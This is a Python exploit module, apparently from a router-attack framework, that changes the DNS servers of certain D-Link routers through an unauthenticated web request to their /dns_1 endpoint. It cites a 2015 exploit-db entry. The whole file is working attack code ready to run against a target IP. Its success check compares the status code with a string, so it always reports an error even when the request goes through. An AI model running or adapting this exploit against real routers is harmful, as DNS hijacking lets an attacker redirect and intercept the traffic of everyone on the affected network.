from requests import get

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name = "Unauthenticated Remote DNS Change",
            category = "csrf",
            authors = "Todor Donev",
            date = "18/02/2015",
            cwe = "CWE-352: Cross-Site Request Forgery (CSRF)",
            description = "Different D-Link Routers are vulnerable to DNS change. The vulnerability exist in the web interface, which is  accessible without authentication. ",
            references = "https://www.exploit-db.com/exploits/35917/"
        )

    def default(self):
        data = {"dns1": "8.8.8.8", "dns2": "8.8.8.8"}

        return data

    def run(self, data):
        DNS1 = data["dns1"]
        DNS2 = data["dns2"]

        if DNS1 or DNS2:
            r = get("http://{0}/dns_1?Enable_DNSFollowing=1&dnsPrimary={1}&dnsSecondary={2}".format(self.getIP(), DNS1, DNS2))

            if r.status_code == "200":
                message = "DNS change successfully"
            else:
                message = "Error"

            return message
        else:
            return "Error"
